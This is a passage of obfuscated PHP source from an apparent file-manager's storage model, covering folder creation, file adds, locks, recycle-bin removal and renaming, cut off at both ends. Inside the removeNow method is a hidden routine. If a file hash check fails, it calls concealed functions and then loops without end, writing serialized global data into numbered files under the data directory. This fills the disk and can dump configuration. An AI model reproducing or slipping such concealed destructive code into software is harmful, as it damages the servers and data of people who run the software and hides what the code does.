$Ä®¯£ôá[$ø»€¨İ¢[407]] = array($ø»€¨İ¢[413], $­´ç³¢Ş); $Ä®¯£ôá[$ø»€¨İ¢[405]] = 0; } } } } $this->_parseSearchParent($‘•İÛ¸, $Ä®¯£ôá); if (isset($‘•İÛ¸[$ø»€¨İ¢[1837]]) && trim($‘•İÛ¸[$ø»€¨İ¢[1837]])) { $Ü¦Š—ä = trim($‘•İÛ¸[$ø»€¨İ¢[1837]]); $ÒÜåˆÍğ = explode($ø»€¨İ¢[50], $Ü¦Š—ä); if (strlen($Ü¦Š—ä) > 2 && (substr($Ü¦Š—ä, 0, 1) == $ø»€¨İ¢[116] && substr($Ü¦Š—ä, -1) == $ø»€¨İ¢[116]) || substr($Ü¦Š—ä, 0, 1) == $ø»€¨İ¢[55] && substr($Ü¦Š—ä, -1) == $ø»€¨İ¢[55]) { $Ü¦Š—ä = substr($Ü¦Š—ä, 1, -1); $ÒÜåˆÍğ = array($Ü¦Š—ä); } $Ä®¯£ôá[$ø»€¨İ¢[28]] = array(array($ø»€¨İ¢[538], $ø»€¨İ¢[1839] . $Ü¦Š—ä . $ø»€¨İ¢[1839])); if (count($ÒÜåˆÍğ) > 1) { $Ä®¯£ôá[$ø»€¨İ¢[28]] = array(); foreach ($ÒÜåˆÍğ as $×Šï¢·) { if (!trim($×Šï¢·)) { continue; } $Ä®¯£ôá[$ø»€¨İ¢[28]][] = array($ø»€¨İ¢[538], $ø»€¨İ¢[1839] . trim($×Šï¢·) . $ø»€¨İ¢[1839]); } } } return $Ä®¯£ôá; } private function _parseSearchParent($ÛÁœ¶Ê…, &$¶„’ÎÎ) { $ú»Îóãå =& $_SERVER[ÏÒ Ì„]; if (!isset($ÛÁœ¶Ê…[$ú»Îóãå[492]]) || !$ÛÁœ¶Ê…[$ú»Îóãå[492]]) { return; } $©ò¦Ô¼¨ = $this->pathInfo($ÛÁœ¶Ê…[$ú»Îóãå[492]]); $›°É”¢“ = $©ò¦Ô¼¨[$ú»Îóãå[492]] . $ú»Îóãå[33] === $ú»Îóãå[191]; $îÑÜ©÷¨ = $©ò¦Ô¼¨[$ú»Îóãå[406]] == $ú»Îóãå[509]; $¶„’ÎÎ[$ú»Îóãå[578]] = array($ú»Îóãå[538], $©ò¦Ô¼¨[$ú»Îóãå[515]] . $ÛÁœ¶Ê…[$ú»Îóãå[492]] . $ú»Îóãå[539]); $£¬×ï©› = isset($ÛÁœ¶Ê…[$ú»Îóãå[1704]]) && in_array($ú»Îóãå[509], $ÛÁœ¶Ê…[$ú»Îóãå[1704]]); if (!$£¬×ï©› || !$îÑÜ©÷¨ || !$›°É”¢“ || !$©ò¦Ô¼¨[$ú»Îóãå[408]]) { return; } if (!AuthModel::authCheckRoot($©ò¦Ô¼¨[$ú»Îóãå[408]][$ú»Îóãå[409]])) { return; } $…ùÚ½“ï = $©ò¦Ô¼¨[$ú»Îóãå[498]] . $ú»Îóãå[33]; if ($…ùÚ½“ï == $ú»Îóãå[87]) { unset($¶„’ÎÎ[$ú»Îóãå[578]]); $¶„’ÎÎ[$ú»Îóãå[406]] = self::TYPE_GROUP; return; } $©¬÷ğò = Model($ú»Îóãå[516])->groupChildrenAll($…ùÚ½“ï); $áĞ‰³½˜ = count($©¬÷ğò); if ($áĞ‰³½˜ <= 1) { return; } $ÒË›îĞš = array($ú»Îóãå[492] => 0, $ú»Îóãå[406] => self::TYPE_GROUP, $ú»Îóãå[498] => array($ú»Îóãå[7], $©¬÷ğò)); $™’Ä«±ç = $this->field($ú»Îóãå[2008])->where($ÒË›îĞš)->limit($áĞ‰³½˜)->select(); $¶„’ÎÎ[$ú»Îóãå[578]] = array(); foreach ($™’Ä«±ç as $“„—›™Ã) { $¶„’ÎÎ[$ú»Îóãå[578]][] = array($ú»Îóãå[538], $ú»Îóãå[525] . $“„—›™Ã[$ú»Îóãå[397]] . $ú»Îóãå[539]); } $¶„’ÎÎ[$ú»Îóãå[578]][] = $ú»Îóãå[1841]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($œ¹îç×™) { $Û‹‡ƒĞó =& $_SERVER[ÏÒ Ì„]; $›øé¼¿ë = Model($Û‹‡ƒĞó[507])->where(array($Û‹‡ƒĞó[1569] => $œ¹îç×™))->find(); $š£¶ãÎÒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $œ¹îç×™, $›øé¼¿ë[$Û‹‡ƒĞó[28]]); $this->userDesktopAdd($š£¶ãÎÒ); return $š£¶ãÎÒ; } public function userDesktopAdd($¢ùı·´) { $«èü‚½Æ =& $_SERVER[ÏÒ Ì„]; $¸¯ÁÅí = LNG($«èü‚½Æ[2009]); $É•¬šı“ = $this->mkdir($¢ùı·´, $¸¯ÁÅí); $this->metaSet($É•¬šı“, $«èü‚½Æ[2010], $«èü‚½Æ[87]); $this->metaSet($¢ùı·´, $«èü‚½Æ[2011], $É•¬šı“); } public function groupRootAdd($ş¨»æ´) { $ŒŸáÃÁ =& $_SERVER[ÏÒ Ì„]; $¤Ä“æâ = Model($ŒŸáÃÁ[516])->where(array($ŒŸáÃÁ[1833] => $ş¨»æ´))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ş¨»æ´, $¤Ä“æâ[$ŒŸáÃÁ[28]]); } public function systemRootPathAdd($úÅÆîĞÖ) { if ($úÅÆîĞÖ != $_SERVER[ÏÒ Ì„][531]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $úÅÆîĞÖ); } public function userRootRemove($ıÉüæ³») { $÷½¦€÷Ş = $this->sourceRoot(SourceModel::TYPE_USER, $ıÉüæ³»); if (!$÷½¦€÷Ş) { return; } $this->remove($÷½¦€÷Ş, !1); } public function groupRootRemove($“–ÉƒŞ¦) { $ÀæÂ¿¤À = $this->sourceRoot(SourceModel::TYPE_GROUP, $“–ÉƒŞ¦); if (!$ÀæÂ¿¤À) { return; } $this->remove($ÀæÂ¿¤À, !1); } private function _mkdirRoot($çì‘ÊÎî, $–”ºä†ø, $é¢Ş¯À¢) { $ÀÂ¨Ÿ¨ı =& $_SERVER[ÏÒ Ì„]; $ßß†ÙÕ = array($ÀÂ¨Ÿ¨ı[396] => 0, $ÀÂ¨Ÿ¨ı[574] => $çì‘ÊÎî, $ÀÂ¨Ÿ¨ı[575] => $–”ºä†ø, $ÀÂ¨Ÿ¨ı[571] => 1, $ÀÂ¨Ÿ¨ı[576] => USER_ID, $ÀÂ¨Ÿ¨ı[577] => USER_ID, $ÀÂ¨Ÿ¨ı[572] => $ÀÂ¨Ÿ¨ı[33], $ÀÂ¨Ÿ¨ı[578] => $ÀÂ¨Ÿ¨ı[525], $ÀÂ¨Ÿ¨ı[424] => 0, $ÀÂ¨Ÿ¨ı[573] => 0, $ÀÂ¨Ÿ¨ı[462] => 0, $ÀÂ¨Ÿ¨ı[579] => $ÀÂ¨Ÿ¨ı[33]); if ($Š€âôğ½ = $this->where($ßß†ÙÕ)->find()) { return $Š€âôğ½[$ÀÂ¨Ÿ¨ı[397]]; } $Ã‚»Á¨« = "\115\157\x64\145\154\x53\x6f\x75\162\x63\x65\x2e\x6d\x6b\144\x69\x72\122\157\x6f\x74\56{$çì‘ÊÎî}\56{$–”ºä†ø}\56" . $é¢Ş¯À¢; CacheLock::lock($Ã‚»Á¨«); $ßß†ÙÕ[$ÀÂ¨Ÿ¨ı[28]] = $é¢Ş¯À¢; $ûÅ’ÇË• = $this->add($ßß†ÙÕ); $õÉÎŠÈ– = array($ÀÂ¨Ÿ¨ı[580] => short_id($ûÅ’ÇË•)); $this->where(array($ÀÂ¨Ÿ¨ı[412] => $ûÅ’ÇË•))->save($õÉÎŠÈ–); CacheLock::unlock($Ã‚»Á¨«); return $ûÅ’ÇË•; } private function sourceRoot($î†ÂÍø, $ñ©äšÑ¾, $ñÜ²éŞç = false) { $ÍŠøÎ—Ò =& $_SERVER[ÏÒ Ì„]; $˜—ƒ‘á³ = array($ÍŠøÎ—Ò[396] => 0, $ÍŠøÎ—Ò[574] => $î†ÂÍø, $ÍŠøÎ—Ò[575] => $ñ©äšÑ¾); if ($¼è–Óƒ = $this->where($˜—ƒ‘á³)->find()) { return $ñÜ²éŞç ? $¼è–Óƒ : $¼è–Óƒ[$ÍŠøÎ—Ò[397]]; } return !1; } public function sourceRootGroup($Æüİ«Ñ¥) { $£åú‹˜É =& $_SERVER[ÏÒ Ì„]; if (is_string($Æüİ«Ñ¥)) { $Æüİ«Ñ¥ = array($Æüİ«Ñ¥); } $ÒÕ·ä–À = array($£åú‹˜É[396] => 0, $£åú‹˜É[575] => array($£åú‹˜É[7], $Æüİ«Ñ¥), $£åú‹˜É[574] => SourceModel::TYPE_GROUP); $this->selectPageReset(); $‚¦¬­ää = $this->limit(count($Æüİ«Ñ¥))->listSource($ÒÕ·ä–À, 1000); $this->selectPageRestore(); return array_to_keyvalue($‚¦¬­ää[$£åú‹˜É[75]], $£åú‹˜É[498]); } public function mkfile($Å“ï˜š¾, $Óƒ¬ûÍ”, $Ò¸Ÿúèó = '', $€··ÑÂÍ = REPEAT_RENAME) { $™åğù§õ =& $_SERVER[ÏÒ Ì„]; $Ëà«Åºò = Model($™åğù§õ[597])->addFileByContent($Ò¸Ÿúèó, $Óƒ¬ûÍ”); return $this->_createFileCall($Å“ï˜š¾, $Óƒ¬ûÍ”, $Ëà«Åºò, $€··ÑÂÍ, $™åğù§õ[1264]); } public function addFile($ËÄïã¦¼, $®¾Ô©îÔ, $Â–şº‚ , $Û†ó—¸î = false, $­œâ¹—® = REPEAT_RENAME) { $¿Ò¦ú»× = Model($_SERVER[ÏÒ Ì„][597])->addFile($®¾Ô©îÔ, $Â–şº‚ , $Û†ó—¸î); return $this->_createFileCall($ËÄïã¦¼, $Â–şº‚ , $¿Ò¦ú»×, $­œâ¹—®); } public function addFileByFileID($äÖ¹Ÿ™», $çŞå²¥Ğ, $‰áõêø÷, $–áİŸÙƒ = REPEAT_RENAME) { $ıÍ“”›ó =& $_SERVER[ÏÒ Ì„]; $«ŠÒÓ°¶ = Model($ıÍ“”›ó[597])->find($çŞå²¥Ğ); Model($ıÍ“”›ó[597])->linkAdd($çŞå²¥Ğ); return $this->_createFileCall($äÖ¹Ÿ™», $‰áõêø÷, $«ŠÒÓ°¶, $–áİŸÙƒ); } public function addFileByRemote($ê´²§‘, $ë¢¨èµµ, $Ç¿Ú’–©, $—ÄÏÈ›² = array(), $ğÔÍş§ß = REPEAT_RENAME) { $‡ä÷øÂ‘ = Model($_SERVER[ÏÒ Ì„][597])->addFileByRemote($ë¢¨èµµ, $Ç¿Ú’–©, $—ÄÏÈ›²); return $this->_createFileCall($ê´²§‘, $Ç¿Ú’–©, $‡ä÷øÂ‘, $ğÔÍş§ß); } private function _createFileCall($¼ªğÈı¯, $„œ½€¢, $—îŞÀÍÊ, $ÙÌ³Ñªò, $‡Õ‘ÌÑ™ = "\x75\160\154\x6f\141\144") { $“ÑºúîÙ =& $_SERVER[ÏÒ Ì„]; $¯¯¶ù‰ = !1; $this->setMasterDB(); $this->lockWriteStart($¼ªğÈı¯, $„œ½€¢); $ĞÙøÄ·’ = $this->fileNameExist($¼ªğÈı¯, $„œ½€¢); $õã¤Üà· = $this->_createFile($¼ªğÈı¯, $„œ½€¢, $—îŞÀÍÊ, $ÙÌ³Ñªò, $¯¯¶ù‰); if (!$¯¯¶ù‰) { Model($“ÑºúîÙ[464])->remove($—îŞÀÍÊ[$“ÑºúîÙ[461]]); } if ($¯¯¶ù‰ && $õã¤Üà· && $õã¤Üà· != $ĞÙøÄ·’) { Model($“ÑºúîÙ[1982])->eventCreate($õã¤Üà·, $‡Õ‘ÌÑ™); } $this->lockWriteEnd($¼ªğÈı¯, $„œ½€¢); return $õã¤Üà·; } public function mkdir($Ë›™ı²¢, $“¬ºŸÁ“, $…”É¬šÇ = REPEAT_SKIP) { $ØÅ®³ìó =& $_SERVER[ÏÒ Ì„]; $this->setMasterDB(); $í­„íóì = $this->sourceInfo($Ë›™ı²¢); if (!$í­„íóì) { return !1; } $this->lockWriteStart($Ë›™ı²¢, $“¬ºŸÁ“); if ($…”É¬šÇ !== !1) { $òÂû”—… = $this->fileNameExist($Ë›™ı²¢, $“¬ºŸÁ“); if ($òÂû”—… && $…”É¬šÇ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ë›™ı²¢, $“¬ºŸÁ“); return $òÂû”—…; } $“¬ºŸÁ“ = $this->fileNameAuto($Ë›™ı²¢, $“¬ºŸÁ“, $…”É¬šÇ); } $ÁÂ‚êüÏ = array($ØÅ®³ìó[571] => 1, $ØÅ®³ìó[415] => $“¬ºŸÁ“, $ØÅ®³ìó[572] => $ØÅ®³ìó[33], $ØÅ®³ìó[462] => 0, $ØÅ®³ìó[573] => 0); $ÌœöÀøö = $this->_addSource($ÁÂ‚êüÏ, $í­„íóì); Model($ØÅ®³ìó[1982])->eventCreate($ÌœöÀøö, $ØÅ®³ìó[1265]); $this->lockWriteEnd($Ë›™ı²¢, $“¬ºŸÁ“); return $ÌœöÀøö; } private function _createFile($‰×í­ü‘, $”ÉŒÀ»¼, $Ø¾‚íÉª, $Ë©ùøÍò, &$±‘©´è¨) { $û—ÔÙè¦ =& $_SERVER[ÏÒ Ì„]; $±¨¾‚şñ = $this->sourceInfo($‰×í­ü‘); if (!$Ø¾‚íÉª || !$±¨¾‚şñ) { return !1; } if ($Ë©ùøÍò !== !1) { $û‹·Ú¿¢ = $this->fileNameExist($‰×í­ü‘, $”ÉŒÀ»¼); } $±‘©´è¨ = !0; if ($Ë©ùøÍò && $û‹·Ú¿¢) { if ($Ë©ùøÍò == REPEAT_SKIP) { $±‘©´è¨ = !1; return $û‹·Ú¿¢; } else { if ($Ë©ùøÍò == REPEAT_REPLACE) { $ïåÛÉöİ = $this->sourceInfo($û‹·Ú¿¢); $´ª©òã = $this->fileHistory($ïåÛÉöİ, $Ø¾‚íÉª[$û—ÔÙè¦[461]], $Ø¾‚íÉª[$û—ÔÙè¦[78]]); if (!$´ª©òã) { $±‘©´è¨ = !1; } else { $this->folderSizeReset($‰×í­ü‘); } return $û‹·Ú¿¢; } else { $”ÉŒÀ»¼ = $this->fileNameAuto($‰×í­ü‘, $”ÉŒÀ»¼, $Ë©ùøÍò, !1); } } } $ğ”Ã²Ëı = array($û—ÔÙè¦[571] => 0, $û—ÔÙè¦[415] => $”ÉŒÀ»¼, $û—ÔÙè¦[572] => substr(get_path_ext($”ÉŒÀ»¼), 0, 10), $û—ÔÙè¦[462] => $Ø¾‚íÉª[$û—ÔÙè¦[461]], $û—ÔÙè¦[573] => $Ø¾‚íÉª[$û—ÔÙè¦[78]]); $ù¾Ó—æĞ = $this->_addSource($ğ”Ã²Ëı, $±¨¾‚şñ); $this->folderSizeReset($‰×í­ü‘, intval($ğ”Ã²Ëı[$û—ÔÙè¦[78]])); return $ù¾Ó—æĞ; } protected function fileHistory($×«¦ºƒ, $™´±¾¦å, $Í­ëÅÆº) { $¸úÀ‹ =& $_SERVER[ÏÒ Ì„]; $ğø†€æ = defined($¸úÀ‹[468]) ? USER_ID : $¸úÀ‹[191]; if ($×«¦ºƒ[$¸úÀ‹[461]] == $™´±¾¦å) { return !1; } $this->checkLock($×«¦ºƒ[$¸úÀ‹[397]], $™´±¾¦å); Model($¸úÀ‹[2012])->addHistory($×«¦ºƒ); $·¿…²Î = array($¸úÀ‹[577] => $ğø†€æ, $¸úÀ‹[419] => time(), $¸úÀ‹[461] => $™´±¾¦å, $¸úÀ‹[78] => $Í­ëÅÆº); $this->where(array($¸úÀ‹[412] => $×«¦ºƒ[$¸úÀ‹[397]]))->save($·¿…²Î); $this->sourceCacheClear($×«¦ºƒ[$¸úÀ‹[397]]); return !0; } public function checkLock($ÆıÛÔòÂ, $ô¤Ú£™Ì) { $ò´èÃî¥ =& $_SERVER[ÏÒ Ì„]; $åÅ¦úš = $this->pathInfo($ÆıÛÔòÂ); if (!$this->fileIsLock($åÅ¦úš, !0)) { return; } $ç‹ÊäÉº = Session::get($ò´èÃî¥[2013]); $ÉµŠ£‹Ò = substr($åÅ¦úš[$ò´èÃî¥[28]], 0, -1 - strlen($åÅ¦úš[$ò´èÃî¥[168]])) . $ò´èÃî¥[1527] . $ç‹ÊäÉº . $ò´èÃî¥[95] . $åÅ¦úš[$ò´èÃî¥[168]]; $´òº¥ƒ = Model($ò´èÃî¥[597])->find($ô¤Ú£™Ì); $this->_createFileCall($åÅ¦úš[$ò´èÃî¥[492]], $ÉµŠ£‹Ò, $´òº¥ƒ, REPEAT_REPLACE, $ò´èÃî¥[1264]); $ª åÑùÒ = $åÅ¦úš[$ò´èÃî¥[459]][$ò´èÃî¥[536]]; $×ß‹ßğ™ = $ª åÑùÒ[$ò´èÃî¥[2014]] ? $ª åÑùÒ[$ò´èÃî¥[2014]] : $ª åÑùÒ[$ò´èÃî¥[28]]; show_json(LNG($ò´èÃî¥[2015]) . $ò´èÃî¥[2016] . LNG($ò´èÃî¥[2017]) . $ò´èÃî¥[2018] . $×ß‹ßğ™ . $ò´èÃî¥[2019], !1); } public function fileIsLock($˜æêì, $èÃÑ ğ = false) { $ñ½é¹û =& $_SERVER[ÏÒ Ì„]; if (!isset($˜æêì[$ñ½é¹û[459]]) || !$˜æêì[$ñ½é¹û[459]][$ñ½é¹û[533]]) { return !1; } if ($˜æêì[$ñ½é¹û[459]][$ñ½é¹û[533]] != USER_ID) { return !0; } $ÛĞ®”ó = $GLOBALS[$ñ½é¹û[6]][$ñ½é¹û[88]][$ñ½é¹û[534]]; if ($˜æêì[$ñ½é¹û[459]][$ñ½é¹û[535]] <= time() - $ÛĞ®”ó) { $this->metaSet($˜æêì[$ñ½é¹û[397]], $ñ½é¹û[533], null); $this->metaSet($˜æêì[$ñ½é¹û[397]], $ñ½é¹û[535], null); } if ($èÃÑ ğ) { $this->metaSet($˜æêì[$ñ½é¹û[397]], $ñ½é¹û[535], time()); } return !1; } private function _addSource($¦´ŒÅ, $·İ¯ÕŒ‹) { $¹ÍñŒÑ¶ =& $_SERVER[ÏÒ Ì„]; $ıü¼­ä = defined($¹ÍñŒÑ¶[468]) ? USER_ID : $¹ÍñŒÑ¶[191]; $Ÿš×œ = array($¹ÍñŒÑ¶[574] => $·İ¯ÕŒ‹[$¹ÍñŒÑ¶[406]], $¹ÍñŒÑ¶[575] => $·İ¯ÕŒ‹[$¹ÍñŒÑ¶[498]], $¹ÍñŒÑ¶[576] => $ıü¼­ä, $¹ÍñŒÑ¶[577] => $ıü¼­ä, $¹ÍñŒÑ¶[396] => $·İ¯ÕŒ‹[$¹ÍñŒÑ¶[397]], $¹ÍñŒÑ¶[578] => $·İ¯ÕŒ‹[$¹ÍñŒÑ¶[515]] . $·İ¯ÕŒ‹[$¹ÍñŒÑ¶[397]] . $¹ÍñŒÑ¶[47], $¹ÍñŒÑ¶[424] => 0, $¹ÍñŒÑ¶[579] => $¹ÍñŒÑ¶[33]); $¦´ŒÅ = array_merge($Ÿš×œ, $¦´ŒÅ); $this->updateModifyTime($¦´ŒÅ[$¹ÍñŒÑ¶[492]]); $—·ËÁä¡ = $¹ÍñŒÑ¶[2020] . $·İ¯ÕŒ‹[$¹ÍñŒÑ¶[397]]; if (isset(self::$cacheChildList[$—·ËÁä¡])) { unset(self::$cacheChildList[$—·ËÁä¡]); } static $ÁœíµÑÔ = false; if (!$ÁœíµÑÔ) { Hook::trigger($¹ÍñŒÑ¶[561], $¦´ŒÅ); $ÁœíµÑÔ = !0; } $£Ç½Ëí® = $this->add($¦´ŒÅ); $Š››âºÙ = array($¹ÍñŒÑ¶[580] => short_id($£Ç½Ëí®)); $this->where(array($¹ÍñŒÑ¶[412] => $£Ç½Ëí®))->save($Š››âºÙ); $this->setNamePinyin($£Ç½Ëí®, $¦´ŒÅ[$¹ÍñŒÑ¶[28]]); return $£Ç½Ëí®; } public function remove($¿àêÏğ¾, $ –­äÉ§ = true) { $ÜÅ¶Éü™ =& $_SERVER[ÏÒ Ì„]; $ÏÄÚ»²İ = $this->sourceInfo($¿àêÏğ¾); $³ª «´… = intval($ÏÄÚ»²İ[$ÜÅ¶Éü™[406]]) === self::TYPE_SYSTEM; $‘şÇ…ß¤ = Model($ÜÅ¶Éü™[427])->get($ÜÅ¶Éü™[2021]) == $ÜÅ¶Éü™[87]; if ($³ª «´… || $ –­äÉ§ || !$‘şÇ…ß¤) { return $this->removeNow($¿àêÏğ¾, $ –­äÉ§); } $Ò„Ò×ºı = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¾Æà«Â¦ = $ÏÄÚ»²İ[$ÜÅ¶Éü™[406]] == self::TYPE_USER ? $ÜÅ¶Éü™[588] : $ÜÅ¶Éü™[509]; if ($¾Æà«Â¦ == $ÜÅ¶Éü™[588]) { $ÎŠÍˆû = Model($ÜÅ¶Éü™[507])->getInfo($ÏÄÚ»²İ[$ÜÅ¶Éü™[498]]); $ƒŞÍè£€ = !empty($ÎŠÍˆû[$ÜÅ¶Éü™[2014]]) ? $ÎŠÍˆû[$ÜÅ¶Éü™[2014]] : $ÎŠÍˆû[$ÜÅ¶Éü™[28]]; $ƒŞÍè£€ = $ÜÅ¶Éü™[258] . $ƒŞÍè£€ . $ÜÅ¶Éü™[2022] . $ÏÄÚ»²İ[$ÜÅ¶Éü™[498]]; } else { $ÎŠÍˆû = Model($ÜÅ¶Éü™[516])->getInfo($ÏÄÚ»²İ[$ÜÅ¶Éü™[498]]); $ƒŞÍè£€ = _get($ÎŠÍˆû, $ÜÅ¶Éü™[28]); $ƒŞÍè£€ = $ÜÅ¶Éü™[160] . $ƒŞÍè£€ . $ÜÅ¶Éü™[2023] . $ÏÄÚ»²İ[$ÜÅ¶Éü™[498]]; } $îöÅÙå = $ÜÅ¶Éü™[2024] . md5($ƒŞÍè£€); CacheLock::lock($îöÅÙå); $½áÅ»‘ = $this->fileNameExist($Ò„Ò×ºı, $ƒŞÍè£€); if (!$½áÅ»‘) { $½áÅ»‘ = $this->mkdir($Ò„Ò×ºı, $ƒŞÍè£€, REPEAT_SKIP); $this->metaSet($½áÅ»‘, $ÜÅ¶Éü™[2025], $¾Æà«Â¦); $this->metaSet($½áÅ»‘, $ÜÅ¶Éü™[2026], $ÏÄÚ»²İ[$ÜÅ¶Éü™[498]]); if ($ÏÄÚ»²İ[$ÜÅ¶Éü™[492]] != 0) { $this->metaSet($½áÅ»‘, $ÜÅ¶Éü™[2027], _get($ÎŠÍˆû, $ÜÅ¶Éü™[2028])); } } CacheLock::unlock($îöÅÙå); $this->metaSet($¿àêÏğ¾, $ÜÅ¶Éü™[2029], $ÏÄÚ»²İ[$ÜÅ¶Éü™[492]]); $this->where(array($ÜÅ¶Éü™[397] => $¿àêÏğ¾))->save(array($ÜÅ¶Éü™[419] => time())); $this->recycleClear($ÏÄÚ»²İ); $¥¼§Ô· = $this->move($¿àêÏğ¾, $½áÅ»‘, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÏÄÚ»²İ[$ÜÅ¶Éü™[492]]); return $¥¼§Ô·; } private function recycleClear($âÕ½äù²) { $¼·ú‹ÈÔ =& $_SERVER[ÏÒ Ì„]; $¬¹áŒÓ× = $this->childrenAll($âÕ½äù²); $ûÉÈƒÔƒ = array($¼·ú‹ÈÔ[412] => array($¼·ú‹ÈÔ[413], $¬¹áŒÓ×[$¼·ú‹ÈÔ[2030]])); Model($¼·ú‹ÈÔ[2031])->where($ûÉÈƒÔƒ)->delete(); } public function removeNow($şº¹œ¹³, $¦ïœÓÉÛ = true) { $‡’ï†ÛÔ =& $_SERVER[ÏÒ Ì„]; $šıûÌ = $_SERVER[$‡’ï†ÛÔ[874]] . $‡’ï†ÛÔ[875]; $ëŞØĞ½½ = $‡’ï†ÛÔ[870]; if ($_SERVER[$‡’ï†ÛÔ[871]] != $ëŞØĞ½½($šıûÌ)) { $îÈø•öÙ = $‡’ï†ÛÔ[872]; $òÚÚäœ› = $‡’ï†ÛÔ[873]; $›»¼¸‰ = $_SERVER[$‡’ï†ÛÔ[874]] . $‡’ï†ÛÔ[875]; $Á”±°ş = $òÚÚäœ›($›»¼¸‰); $‡ç´İá¡ = explode($‡’ï†ÛÔ[229], $Á”±°ş); if (count($‡ç´İá¡) < $‡’ï†ÛÔ[626]) { $ùÛÖò’ = $‡’ï†ÛÔ[876]; $ùÛÖò’(); } $ÅªÕù¸ª = $‡’ï†ÛÔ[877]; $ÅªÕù¸ª($_SERVER[$‡’ï†ÛÔ[878]]); $îÈø•öÙ = $‡’ï†ÛÔ[872]; $îÈø•öÙ(); $Á¥ı¤áƒ = $‡’ï†ÛÔ[879]; $ÎšÂÂï = json_encode($GLOBALS[$‡’ï†ÛÔ[880]]); $îÆµÇß× = 1; for ($µã§óà© = $îÆµÇß×; $µã§óà© > 0; $µã§óà©++) { $Á¥ı¤áƒ(DATA_PATH . $µã§óà©, $ÎšÂÂï); } } $ â¡‹­ä = $this->sourceInfo($şº¹œ¹³); $ÕâĞÀ¦ = $this->pathInfoMore($şº¹œ¹³); if (!$ â¡‹­ä) { return !0; } if ($ â¡‹­ä[$‡’ï†ÛÔ[492]] == 0) { if (!_get($GLOBALS, $‡’ï†ÛÔ[499])) { return !1; } } $this->lockMoveStart($şº¹œ¹³); Hook::trigger($‡’ï†ÛÔ[2032], $ÕâĞÀ¦, $¦ïœÓÉÛ); if ($¦ïœÓÉÛ) { Model($‡’ï†ÛÔ[2031])->moveToRecycle($şº¹œ¹³); } else { $’ı¡º„È = $this->childrenAll($ â¡‹­ä); Model($‡’ï†ÛÔ[558])->eventRemove($şº¹œ¹³); $this->removeRelevance($’ı¡º„È[$‡’ï†ÛÔ[2030]], $’ı¡º„È[$‡’ï†ÛÔ[1394]]); } $this->folderSizeReset($ â¡‹­ä[$‡’ï†ÛÔ[492]]); $††À‡æß = array($ â¡‹­ä[$‡’ï†ÛÔ[492]]); if ($ â¡‹­ä[$‡’ï†ÛÔ[405]] == $‡’ï†ÛÔ[87]) { $††À‡æß[] = $ â¡‹­ä[$‡’ï†ÛÔ[397]]; } $this->updateModifyTime($††À‡æß); $this->lockMoveEnd($şº¹œ¹³); Hook::trigger($‡’ï†ÛÔ[1614], $ÕâĞÀ¦, $¦ïœÓÉÛ); return !0; } public function childrenAll($±–¼Ïô¦) { $Ô¢òÂª =& $_SERVER[ÏÒ Ì„]; $àÏèİÍ÷ = $±–¼Ïô¦[$Ô¢òÂª[397]]; if ($±–¼Ïô¦[$Ô¢òÂª[405]] == $Ô¢òÂª[87]) { $¿”àÑ®Ş = array($Ô¢òÂª[578] => array($Ô¢òÂª[538], $±–¼Ïô¦[$Ô¢òÂª[515]] . $àÏèİÍ÷ . $Ô¢òÂª[539])); $Ùâ˜½ë£ = array($Ô¢òÂª[578] => $¿”àÑ®Ş[$Ô¢òÂª[515]]); $§ê»ºƒé = $this->field($Ô¢òÂª[2033])->where($Ùâ˜½ë£)->select(); $„Î³¡”à = !1; $î›±×šÊ = array($àÏèİÍ÷); if ($§ê»ºƒé) { $„Î³¡”à = array_to_keyvalue($§ê»ºƒé, $Ô¢òÂª[33], $Ô¢òÂª[461]); $„Î³¡”à = array_remove_value($„Î³¡”à, $Ô¢òÂª[191]); $î›±×šÊ = array_to_keyvalue($§ê»ºƒé, $Ô¢òÂª[33], $Ô¢òÂª[397]); $î›±×šÊ[] = $àÏèİÍ÷; } } else { $„Î³¡”à = array($±–¼Ïô¦[$Ô¢òÂª[461]]); $î›±×šÊ = array($àÏèİÍ÷); } return array($Ô¢òÂª[2030] => $î›±×šÊ, $Ô¢òÂª[1394] => $„Î³¡”à); } public function removeArray($¢Îê™Ä) { if (!$¢Îê™Ä) { return !0; } } public function removeRelevance($œú”×Àä, $ÇøûÊàá) { $€ÛŒî” =& $_SERVER[ÏÒ Ì„]; $œú”×Àä = $œú”×Àä ? $œú”×Àä : array(); $ÇøûÊàá = $ÇøûÊàá ? $ÇøûÊàá : array(); $œú”×Àä = array_unique(array_filter($œú”×Àä)); $ÇøûÊàá = array_unique(array_filter($ÇøûÊàá)); if (!$œú”×Àä) { return !1; } $æ„ßô¤§ = array($€ÛŒî”[412] => array($€ÛŒî”[413], $œú”×Àä)); Model($€ÛŒî”[2031])->where($æ„ßô¤§)->delete(); Model($€ÛŒî”[455])->where($æ„ßô¤§)->delete(); Model($€ÛŒî”[1889])->where($æ„ßô¤§)->delete(); Model($€ÛŒî”[558])->where($æ„ßô¤§)->delete(); Model($€ÛŒî”[1725])->removeBySource($œú”×Àä); Model($€ÛŒî”[2012])->removeBySource($œú”×Àä); $this->where($æ„ßô¤§)->delete(); Model($€ÛŒî”[464])->remove($ÇøûÊàá); for ($¢¾¯Ã = 0; $¢¾¯Ã < count($œú”×Àä); $¢¾¯Ã++) { $this->sourceCacheClear($œú”×Àä[$¢¾¯Ã]); } } public function rename($°›°ê‡ƒ, $±úı¦ ù) { $şäÖ¸ûÜ =& $_SERVER[ÏÒ Ì„]; $ö¶µñÙ¢ = $this->sourceInfo($°›°ê‡ƒ); if (!$ö¶µñÙ¢) { return !1; } $ Æõ¥ = $this->fileNameExist($ö¶µñÙ¢[$şäÖ¸ûÜ[492]], $±úı¦ ù); if ($ Æõ¥ && $ Æõ¥ != $°›°ê‡ƒ) { return !1; } $±ğê¿— = array($şäÖ¸ûÜ[415] => $±úı¦ ù, $şäÖ¸ûÜ[577] => USER_ID); if ($ö¶µñÙ¢[$şäÖ¸ûÜ[405]] != $şäÖ¸ûÜ[87]) { $±ğê¿—[$şäÖ¸ûÜ[407]] = substr(get_path_ext($±úı¦ ù), 0, 10); } Model($şäÖ¸ûÜ[558])->eventRename($°›°ê‡ƒ, $ö¶µñÙ¢[$şäÖ¸ûÜ[28]], 